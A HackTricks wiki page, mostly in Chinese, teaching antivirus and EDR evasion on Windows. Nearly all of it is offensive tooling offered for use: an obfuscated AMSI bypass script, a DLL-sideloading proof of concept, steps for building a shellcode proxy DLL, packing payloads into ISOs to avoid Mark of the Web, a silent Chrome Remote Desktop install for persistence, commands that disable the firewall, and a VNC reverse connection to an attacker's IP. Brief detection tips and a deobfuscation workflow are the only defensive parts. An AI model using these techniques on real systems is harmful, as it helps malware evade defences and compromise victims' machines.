# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**本页作者：** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot)：一个用于停止 Windows Defender 正常工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender)：通过伪装成另一个 AV 来停止 Windows Defender 工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

目前，AVs 会使用不同的方法来判断文件是否恶意：static detection、dynamic analysis，以及对于更高级的 EDRs，还会有 behavioural analysis。

### **Static detection**

Static detection 是通过在二进制或脚本中标记已知的恶意字符串或字节数组来实现的，同时也会从文件本身提取信息（例如 file description、company name、digital signatures、icon、checksum 等）。这意味着使用已知的公共工具可能更容易被发现，因为这些工具很可能已经被分析并标记为恶意。针对这类检测有几种常见的规避方法：

- **Encryption**

如果你对二进制文件进行加密，AV 就无法检测到你的程序，但你需要某种 loader 来在内存中解密并运行该程序。

- **Obfuscation**

有时只需更改二进制或脚本中的一些字符串即可绕过 AV，但这可能是一项耗时的工作，具体取决于你要混淆的内容。

- **Custom tooling**

如果你自己开发工具，就不会有已知的恶意签名，但这需要大量时间和精力。

> [!TIP]
> 检查 Windows Defender static detection 的一个好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件分割成多个片段，然后让 Defender 单独扫描每个片段，这样可以准确告诉你二进制中被标记的字符串或字节。

强烈建议查看这个关于实用 AV Evasion 的 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **Dynamic analysis**

Dynamic analysis 是指 AV 在沙箱中运行你的二进制并监视恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这部分可能更难对付，但可以通过以下方式来规避沙箱。

- **Sleep before execution** 根据实现方式不同，这可能是绕过 AV dynamic analysis 的好方法。AV 的扫描时间通常很短以免打断用户工作流，所以使用较长的 sleep 可以干扰二进制的分析。但问题是许多 AV 的沙箱可以根据实现方式跳过 sleep。
- **Checking machine's resources** 通常沙箱可用的资源很少（例如 < 2GB RAM），否则会影响用户机器的性能。你也可以在这方面发挥创意，例如检查 CPU 温度或风扇转速，沙箱并非会实现所有检测项。
- **Machine-specific checks** 如果你想针对某位加入到 "contoso.local" 域的用户，你可以检查计算机的域是否匹配指定值，如果不匹配就让程序退出。

事实证明，Microsoft Defender 的 Sandbox computername 是 HAL9TH，所以你可以在恶意程序触发前检查计算机名，如果名字匹配 HAL9TH，说明你在 defender 的沙箱内，这时可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

以下是来自 [@mgeeky](https://twitter.com/mariuszbit) 的一些对抗 Sandboxes 的优秀建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

正如我们在本文前面所述，**public tools** 最终会被 **detected**，所以你应该自问：

例如，如果你想 dump LSASS，**真的必须使用 mimikatz 吗**？还是可以使用一个不那么知名但同样可以 dump LSASS 的项目？

更合适的答案很可能是后者。以 mimikatz 为例，它可能是被 AVs 和 EDRs 标记最多的工具之一，虽然项目本身很酷，但在规避 AV 时使用它会非常头疼，所以为你要实现的目标寻找替代方案会更好。

> [!TIP]
> 在为 evasion 修改 payloads 时，确保在 Defender 中**关闭自动样本提交**，并且请注意，**DO NOT UPLOAD TO VIRUSTOTAL**，如果你的目标是长期实现 evasion。如果你想检查某个 AV 是否会检测你的 payload，建议在 VM 上安装该 AV，尝试关闭自动样本提交，并在该环境中测试直到满意为止。

## EXEs vs DLLs

只要可能，始终**优先使用 DLL 来进行 evasion**，根据我的经验，DLL 文件通常**被检测和分析的概率远低于 EXE**，所以这是在某些情况下避免检测的一个非常简单的技巧（前提是你的 payload 有办法以 DLL 形式运行）。

如图所示，来自 Havoc 的一个 DLL Payload 在 antiscan.me 的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

下面我们将展示一些可用于让 DLL 文件更隐蔽的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 使用的 DLL 搜索顺序，通过将易受害的应用程序与恶意 payload 放在相同目录下，从而进行劫持。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和以下 powershell 脚本来检查哪些程序易受 DLL Sideloading 影响：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令将输出位于 "C:\Program Files\\" 中易受 DLL hijacking 的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你 **explore DLL Hijackable/Sideloadable programs yourself**，如果正确实施，该技术相当隐蔽，但如果你使用公开已知的 DLL Sideloadable programs，可能很容易被发现。

仅仅通过放置一个与程序期望加载的名称相同的恶意 DLL 并不能保证会加载你的 payload，因为程序会期望该 DLL 中包含某些特定的函数。为了解决这个问题，我们将使用另一种技术，称为 **DLL Proxying/Forwarding**。

**DLL Proxying** 将程序从代理（和恶意）DLL 发出的调用转发到原始 DLL，从而保留程序的功能并能够处理你的 payload 的执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

我遵循的步骤如下：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们两个文件：一个 DLL 源代码模板，以及原始被重命名的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 的检测率均为 0/26！我会称之为成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我 **强烈建议** 你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading，并且也观看 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) 以更深入了解我们讨论的内容。

### 滥用 转发导出 (ForwardSideLoading)

Windows PE 模块可以导出实际上是“转发器”的函数：导出条目不是指向代码，而是包含形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows loader 将：

- 如果尚未加载，则加载 `TargetDll`
- 并从中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，则它从受保护的 KnownDLLs 命名空间中提供（例如 ntdll, kernelbase, ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用常规的 DLL 搜索顺序，其中包括执行转发解析的模块所在目录。

这使得一种间接 sideloading 原语成为可能：找到一个导出被转发到非 KnownDLL 模块名的签名 DLL，然后将该签名 DLL 与一个由攻击者控制、且命名与转发目标模块完全相同的 DLL 放在同一目录下。当调用该转发导出时，加载器将解析转发并从同一目录加载你的 DLL，执行你的 DllMain。

在 Windows 11 上观察到的示例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此通过常规搜索顺序解析。

PoC (copy-paste):
1) 复制已签名的系统 DLL 到一个可写入的文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 将一个恶意的 `NCRYPTPROV.dll` 放在相同的文件夹中。一个最小的 DllMain 就足以获得代码执行；你不需要实现被转发的函数来触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（已签名）加载 side-by-side `keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会跟随转发到 `NCRYPTPROV.SetAuditingInterface`
- 随后加载器从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，只有在 `DllMain` 已经运行后你才会遇到 "missing API" 错误

Hunting tips:
- 关注那些转发导出（forwarded exports），其目标模块不是 KnownDLL。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用以下工具列举转发导出：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项: https://hexacorn.com/d/apis_fwd.txt

检测/防御 思路:
- 监控 LOLBins (例如，rundll32.exe) 从非系统路径加载已签名的 DLL，然后从该目录加载具有相同基名的 non-KnownDLLs
- 对如下进程/模块链发出告警: `rundll32.exe` → 非系统 `keyiso.dll` → `NCRYPTPROV.dll` 位于用户可写路径下
- 实施代码完整性策略 (WDAC/AppLocker)，并在应用程序目录中拒绝写+执行权限

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽的方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 对抗只是一场猫捉老鼠的游戏，今天有效的方法明天可能就会被检测到，所以不要只依赖单一工具，尽可能将多种 evasion techniques 串联使用。

## AMSI (Anti-Malware Scan Interface)

AMSI 是为防止 "fileless malware" 而创建的。最初，AVs 只能扫描磁盘上的文件，因此如果你能以某种方式直接在内存中执行 payloads，AV 就无法阻止，因为它没有足够的可见性。

AMSI 功能集成在 Windows 的以下组件中。

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

它通过以未加密且未混淆的形式暴露脚本内容，允许防病毒解决方案检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 上产生如下警告。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是运行该脚本的可执行文件的路径，在本例中为 powershell.exe

我们没有在磁盘上写入任何文件，但仍然因为 AMSI 而在内存中被拦截。

此外，从 **.NET 4.8** 开始，C# 代码也会通过 AMSI 运行。这甚至影响到 `Assembly.Load(byte[])` 用于加载内存执行。因此如果想绕过 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低）来进行内存执行。

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此修改你尝试加载的脚本可能是规避检测的一个好方法。

不过，AMSI 具备对脚本进行去混淆的能力，即便有多层混淆也可能被还原，所以具体如何混淆决定了它是否有效。有时只需改几个变量名就能通过检测，取决于被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将一个 DLL 注入到 powershell（以及 cscript.exe、wscript.exe 等）进程来实现的，即使以非特权用户身份运行也很容易进行篡改。基于 AMSI 实现中的这一缺陷，研究人员找到了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制使 AMSI 初始化失败（amsiInitFailed）将导致当前进程不启动任何扫描。最初这是由 [Matt Graeber](https://twitter.com/mattifestation) 披露的，Microsoft 已经开发了一个签名以防止其被广泛利用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需要一行 powershell 代码就能使当前 powershell 进程中的 AMSI 无法工作。 当然，这一行已被 AMSI 检测到，所以要使用该技术需要对其进行一些修改。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 取得的已修改 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请注意，一旦这篇文章发布，可能会被标记，因此如果你计划保持不被发现，不应发布任何代码。

**Memory Patching**

该技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，涉及查找 amsi.dll 中 "AmsiScanBuffer" 函数的地址（负责扫描用户提供的输入），并用返回 E_INVALIDARG 代码的指令覆盖它。这样，实际扫描的结果将返回 0，被解释为“干净”的结果。

> [!TIP]
> 详细解释请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)。

还有许多使用 PowerShell 绕过 AMSI 的其他技术，查看 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) 和 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多。

该工具 [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) 也会生成用于绕过 AMSI 的脚本。

**Remove the detected signature**

你可以使用诸如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 的工具，从当前进程的内存中移除检测到的 AMSI 签名。该工具通过扫描当前进程内存中的 AMSI 签名，然后用 NOP 指令覆盖它，从而有效地将其从内存中移除。

**AV/EDR products that uses AMSI**

可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**Use Powershell version 2**
如果你使用 PowerShell 版本 2，AMSI 将不会被加载，因此你可以运行脚本而不被 AMSI 扫描。你可以这样做：
```bash
powershell.exe -version 2
```
## PS 日志

PowerShell logging 是一项功能，允许记录系统上执行的所有 PowerShell 命令。此功能对审计和故障排除很有用，但对想要规避检测的攻击者来说也是一个问题。

要绕过 PowerShell 日志，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**：你可以使用工具例如 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 来实现。
- **Use Powershell version 2**：如果使用 PowerShell version 2，AMSI 将不会被加载，因此可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来生成一个没有防护的 powershell 会话（这也是 `powerpick` 来自 Cobal Strike 时所使用的方法）。

## 混淆

> [!TIP]
> 若干混淆技术依赖对数据进行加密，这会增加二进制文件的熵，从而更容易被 AVs 和 EDRs 检测到。对此要小心，或许只对代码中敏感或需要隐藏的特定部分应用加密。

### 对由 ConfuserEx 保护的 .NET 二进制文件进行去混淆

在分析使用 ConfuserEx 2（或其商业分支）的恶意软件时，通常会遇到多层保护，阻止反编译器和沙箱。下面的工作流程可以可靠地**恢复接近原始的 IL**，之后可以在 dnSpy 或 ILSpy 等工具中将其反编译为 C#。

1.  反篡改移除 – ConfuserEx 会加密每个 *method body* 并在 *module* 的静态构造函数 (`<Module>.cctor`) 中解密。它还会修补 PE 校验和，因此任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 来定位被加密的元数据表，恢复 XOR 密钥并重写一个干净的 assembly：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个反篡改参数（`key0-key3`, `nameHash`, `internKey`），在构建自定义 unpacker 时可能会有用。

2.  符号 / 控制流恢复 – 将 *clean* 文件输入到 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – 选择 ConfuserEx 2 profile  
• de4dot 会撤销控制流扁平化，恢复原始的命名空间、类和变量名，并解密常量字符串。

3.  代理调用剥离 – ConfuserEx 用轻量级包装器（亦称 *proxy calls*）替换直接方法调用，以进一步破坏反编译。使用 **ProxyCall-Remover** 将其移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
在此步骤之后，你应当看到正常的 .NET API，例如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的包装函数（如 `Class8.smethod_10`，…）。

4.  手动清理 – 在 dnSpy 中运行生成的二进制，搜索大型 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用以定位 *真实* 载荷。通常恶意软件会将其作为在 `<Module>.byte_0` 中初始化的 TLV 编码字节数组存储。

上述链在**不**需要运行恶意样本的情况下恢复执行流——在离线工作站上非常有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可用作 IOC 来自动归类样本。

#### 单行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 本项目的目标是提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提升软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 语言在编译时生成 obfuscated code，而无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 添加一层由 C++ template metaprogramming framework 生成的 obfuscated operations，从而让想要 crack the application 的人更加困难。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够对多种 pe 文件进行 obfuscate，包括：.exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意可执行文件的简易 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个针对 LLVM-supported languages、使用 ROP (return-oriented programming) 的细粒度 code obfuscation framework。ROPfuscator 在汇编级别对程序进行 obfuscate，通过将常规指令转换为 ROP chains，破坏我们对正常 control flow 的直观理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode 并加载它们

## SmartScreen 与 MoTW

当从互联网上下载并执行某些可执行文件时，你可能见过这个界面。

Microsoft Defender SmartScreen 是一项安全机制，旨在保护终端用户不运行可能的恶意应用程序。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要基于 reputation-based 的方法工作，这意味着不常见下载的应用会触发 SmartScreen，从而提醒并阻止终端用户执行该文件（尽管仍可以通过点击 More Info -> Run anyway 来执行该文件）。

**MoTW** (Mark of The Web) 是一个名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，当从互联网下载文件时会自动创建，并包含下载来源的 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 需要注意的是，用 **trusted** 签名证书签名的可执行文件**不会触发 SmartScreen**。

防止 payloads 被打上 Mark of The Web 的一种非常有效的方法是将它们打包到某种容器中，例如 ISO。这是因为 Mark-of-the-Web (MOTW) **无法** 应用于非 NTFS 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器以规避 Mark-of-the-Web 的工具。

示例用法：
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志记录机制，允许应用程序和系统组件**记录事件**。但是，它也可能被安全产品用来监视和检测恶意活动。

类似于 AMSI 被禁用（绕过）的方式，也可以让用户态进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。これは通过在内存中修改该函数使其立即返回来完成，从而有效地禁用了该进程的 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 找到更多信息。


## C# Assembly Reflection

Loading C# binaries in memory 已经存在相当长一段时间，并且仍然是运行 post-exploitation 工具而不被 AV 发现的一个很好的方式。

由于 payload 会直接加载到内存而不接触磁盘，我们只需要担心为整个进程补丁 AMSI。

大多数 C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) 已经提供了直接在内存中执行 C# assemblies 的能力，但有不同的方法可以做到这一点：

- **Fork\&Run**

它涉及**生成一个新的牺牲进程（sacrificial process）**，将你的 post-exploitation 恶意代码注入到该新进程中，执行你的恶意代码，完成后终止该新进程。这既有优点也有缺点。fork and run 方法的优点是执行发生在我们的 Beacon implant 进程**之外**。这意味着如果我们的 post-exploitation 操作出现问题或被捕获，我们的**植入体更有可能幸存。**缺点是更有可能被**Behavioural Detections** 发现。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这是将 post-exploitation 恶意代码**注入到其自身进程**。这样你可以避免创建新进程并被 AV 扫描，但缺点是在 payload 执行出现问题时，更有可能**丢失你的 beacon**，因为它可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想阅读更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell**加载 C# Assemblies，参见 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)，通过让受害机器访问**部署在 Attacker Controlled SMB share 上的解释器环境**，可以使用其他语言来执行恶意代码。

通过允许访问 SMB share 上的 Interpreter Binaries 和环境，你可以在被攻破机器的内存中**以这些语言执行任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过使用 Go、Java、PHP 等，我们在**绕过静态签名**方面具有更大的灵活性。使用这些语言的随机未混淆 reverse shell 脚本进行测试已被证明是成功的。

## TokenStomping

Token stomping 是一种技术，允许攻击者**操作访问令牌或像 EDR 或 AV 这样的安全产品的令牌**，使其权限降低，从而进程不会终止，但没有权限检查恶意活动。

为防止此类情况，Windows 可以**阻止外部进程**获取安全进程令牌的句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，只需在受害者 PC 上部署 Chrome Remote Desktop，然后使用它来接管并保持持久性就很容易：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI。
2. 在受害者上静默运行安装程序（需要管理员）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击 next。向导会要求你授权；点击 Authorize 按钮继续。
4. 执行给定的参数并做一些调整：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` （注意 pin 参数允许在不使用 GUI 的情况下设置 pin）。

## Advanced Evasion

Evasion 是一个非常复杂的主题，有时你必须在单个系统中考虑许多不同的遥测源，因此在成熟的环境中几乎不可能完全保持不被发现。

每个你面对的环境都会有其自身的强项和弱点。

我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以便对更高级的 Evasion 技术有一个入门了解。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除二进制的部分内容**，直到**找出 Defender 认为是恶意的部分**并把它拆分出来。\
另一个做**同样事情的工具是** [**avred**](https://github.com/dobin/avred)，并在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供了一个开放的 web 服务。

### **Telnet Server**

直到 Windows10 之前，所有 Windows 都自带一个可以安装的 **Telnet server**（以管理员身份）执行：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使其在系统启动时**启动**并立即**运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口** (stealth) 并禁用 firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从这里下载: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (你想要 the bin downloads, not the setup)

**在主机上**: 执行 _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 为 _VNC Password_ 设置密码
- 为 _View-Only Password_ 设置密码

然后，将二进制文件 _**winvnc.exe**_ 和 **新创建** 的文件 _**UltraVNC.ini**_ 移动到 **victim** 内

#### **Reverse connection**

**attacker** 应该在他的 **host** 上 **execute inside** 二进制文件 `vncviewer.exe -listen 5900`，这样它将被 **prepared** 用来捕获反向 **VNC connection**。然后在 **victim** 内：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：** 为了保持隐蔽，你必须避免以下几件事

- 不要在 `winvnc` 已经运行时启动 `winvnc`，否则你会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。通过 `tasklist | findstr winvnc` 检查它是否在运行
